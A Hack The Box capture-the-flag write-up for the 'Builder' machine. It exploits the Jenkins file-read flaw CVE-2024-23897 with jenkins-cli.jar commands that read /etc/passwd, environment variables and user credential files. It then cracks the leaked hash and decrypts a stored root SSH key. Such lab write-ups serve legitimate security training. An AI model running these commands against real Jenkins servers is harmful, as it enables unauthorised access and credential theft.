---
title: Hack The Box | Builder Writeup  
date: 2024-03-15 23:00:00 +0530
categories: [Blogging, Writeup, Hack The Box]
tags: [Builder, HTB, Writeup] 
pin: false
math: true
mermaid: true
author: 7h3h0und
image:
  path: /assets/img/headers/builder.webp
  lqip: data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAADKUlEQVR4nJ2VyZLcVBBFz82noVRd1XZ3Gw8LItixIQL+/2sYFzZENe6aJL33MlmobIIFdBktFaHMmzfPTenu3bfB/3iSQQSsO/HiRpQSPJ1FcENjLZKwFKyGI7IgPCACd2eet3htiag0X9rYBDVgdzTaVOlbsTsID0i6obEOM4CGtjtilnFPgOMO4DTpROUOD64XsO7g5XpgO9zx1UPD3VY0tkYSESP7vXjcw2Hcs58mxpIhjJzXmDIoEMKjJzAsAW7PCwigMbgdGm6He+5fvuLNQ+HhJkG8RRIpfaCziscAtKDfqedCDRBACCEWCZd35hjXCAjom2C76tkOL9gOt7x7MfH17YDiG2QCy9j8xP6wIfcBfORUCqcZTIIQYP+c6sKD/UtfuCiNgCbB0DYka1j1mc36xNBNeOqo1tC1M6vuQNvMKESfEq3Bwl18bhoO7uAReIhS/DoGTJBMyJxhDet1y919wypVplzoq9M2BaWZMU+0SQsbDmAEIGmZ3BdHanHElRBGQHWQCm0yVLYMumEzFHLr2PyKD93MZiVMmcAJHBAegSKoWuoEiyPzlEmpeV6ABMVhKoUmH/m47/iZnjRVVuufyAXylPnx/czjYWTMeyzNTMWJACcIr/hlFX9jaETovwXERcBUxNN5IvTIbp85jcb7x0LqRC4iinEaM1MVp2kizDlPvjgeEOHUGkggLRdsvQm8jlc4AJQKx9npuonzbAx9h7WBDKSgRCZ75jhCDhinYM7CjIvhjkeQtFQMgtQIaboSQjMi9RQlqvf0/ZbbbY+xhCso7PYjbhNnL5xPIykVtAQeAlJazjcKiEr1AH9mBbDEyCRkiaeTM5eJHOLpnFE4EUFI7I+Zw+icZggZlrTcfy7wReDB5RwF7kJcGcMAwp1pzpzHifOU+eMpU0olPGiScM+LUwgpMERcyEciSZ8BNCVMI1wjQBLuzuOfH3n75jU/fP8dh+ORYbVit3vk9cuezZDI3vB+d+K3X3+hlkqT0vI9gWgWIV5wO/MpC5DQl/yO3X2ZOhaiPaAxcX8j2gZOU0AzsFmvSCyZ16c1LBUWS2Sf3fgL3a7ZRBi6aE4AAAAASUVORK5CYII=
---
## Summary:
Builder, is a medium-difficulty Linux machine, runs a Jenkins instance. The attacker finds a vulnerability (CVE-2024-23897) in Jenkins, allowing unauthorized access to read files on the system. 

Exploiting this vulnerability, the attacker extracts the username and password crackable hash for the Jenkins user. Which is then used to log in to the Jenkins instance. 

Finally, the attacker uses an encrypted SSH key to escalate privileges and gain full root access on the Builder machine. 

## Enumeration:
### Port Scan:
Let's start with nmap scan to see open ports and services.

```bash
# Nmap 7.94SVN scan initiated Wed Mar 13 15:35:33 2024 as: nmap -sV -sC -oA builder 10.129.230.220
Nmap scan report for 10.129.230.220
Host is up (0.058s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
| http-robots.txt: 1 disallowed entry 
|_/
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Jetty(10.0.18)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 13 15:35:43 2024 -- 1 IP address (1 host up) scanned in 10.26 seconds
```
The Nmap scan revealed SSH and Jenkins on their default ports i.e., 22 and 8080, respectively.

#### Jenkins:

While visiting the http:// 10.129.230.220:8080, we land on default Jenkins page.

![img-description](/assets/img/htb/builder/1.png) _jenkins_

As we see at the bottom right of the page we can see the installed version of Jenkins. With some Online research reveals a critical vulnerability [CVE-2024-23897](https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897) affecting this version. Which allows unauthenticated attackers to read files on Jenkins controller file system.  

The above proof of concept suggests that use of Jenkins-cli.jar to exploit vulnerability and the Jenkins-cli.jar file can be retrieved from host machine itself.  

```bash
wget http://10.129.230.220:8080/jnlpJars/jenkins-cli.jar
java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http help 1 "@/etc/passwd"

ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin java -jar jenkins-cli.jar help [COMMAND] Lists all the available commands or a detailed description of single command. COMMAND: Name of the command (default: root:x:0:0:root:/root:/bin/bash)
```
## Initial Steps:
As we know that exploit works, let’s enumerate further. With some efforts which didn’t work out I went ahead and looked at the environment variables. 

```bash
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' help 
"@/proc/self/environ" 

HOSTNAME=0f52c222a4ccHOME=/var/jenkins_home
```
>/proc/self/environ is a virtual file in Linux that holds the environment variables for the currently running process.  This file is useful for the process itself to access its environment variables, but it can also be accessed by some programs.
{: .prompt-info }

Now, with this we know that the home directory is found at /var/jenkins_home.

Looking further into it we see `user.txt` file.

```bash
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' help "@/var/jenkins_home/user.txt"
```
We now own the user of machine.
## Privilege escalation to Root:
On another online search took me to an article on setting up Jenkins, which revealed key information on user records and key files that may be useful.  

Based on the article there should be a `users.xml` file that should be giving us admin username (Jenkins web portal).  

```bash
java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node "@/var/jenkins_home/users/users.xml
```

![img-description](/assets/img/htb/builder/2.png) _users.xml_

Awesome we now have the username  `jennifer_12108429903186576833` 
Now for the password we need to look into config.xml file under username folder.
```bash
java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">: No such agent "    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">" exists.
....
....
<?xml version='1.1' encoding='UTF-8'?>: No such agent "<?xml version='1.1' encoding='UTF-8'?>" exists.
  <fullName>jennifer</fullName>: No such agent " 
   <fullName>jennifer</fullName>" exists.
      <seed>6841d11dc1de101d</seed>: No such agent "      
      <seed>6841d11dc1de101d</seed>" exists.
  <id>jennifer</id>: No such agent "  <id>jennifer</id>" exists.
  <version>10</version>: No such agent "  <version>10</version>" exists.
      <tokenStore>: No such agent "      <tokenStore>" exists.
          <filterExecutors>false</filterExecutors>: No such agent "          
          <filterExecutors>false</filterExecutors>" exists.
    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>: No such agent "    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>" exists.
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>: 
      
      No such agent "      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>" exists.

ERROR: Error occurred while performing this command, see previous stderr output.
```
This revealed a hashed password `$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a` for the user.  

I was able to crack the password using hashcat.
```bash
sudo hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```

![img-description](/assets/img/htb/builder/3.png) _hashcat_

Using the credentials `jennifer:princess`, we can log into the remote Jenkins instance. 

Enumerating further, I saw SSH keys stored in `Global credentials`.  Going into the confiuration  I saw the SSH key belongs to root.  However, trying to view the key it says `Concealed for confidentiality`. 

![img-description](/assets/img/htb/builder/4.png) _users.xml_

Inspecting the page elements, I saw there is a hidden form filed which reaved encrypted private key.  

![img-description](/assets/img/htb/builder/5.png) _Concealed for confidentiality_

Back to online research, I learned we can decrypt the encrypted key from console itself using [hudson.util.Secret.decrypt()](https://www.shellhacks.com/jenkins-credentials-plugin-decrypt-password/) function.

![img-description](/assets/img/htb/builder/6.png) _jenkins: Decrypting SSH key_

We can save the decrypted key and login root with the key through SSH.

![img-description](/assets/img/htb/builder/7.png) _SSH: Login as Root_

>`nano root_idsa:` This command opens the file named id_rsa using the nano text editor. You can paste your SSH private key content into this editor and save the file.
{: .prompt-info}
>`chmod 600 root_idsa:` This command changes the permissions of the id_rsa file. The first digit (6) stands for the owner's permissions, 6 translates to read and write permissions for the owner. The second and third digits (00) represent permissions for the group and others, since both are set to 0, neither the group nor others have any permissions (read, write, or execute) for this file. 
{: .prompt-info}

We have the machine `ROOTED! `  


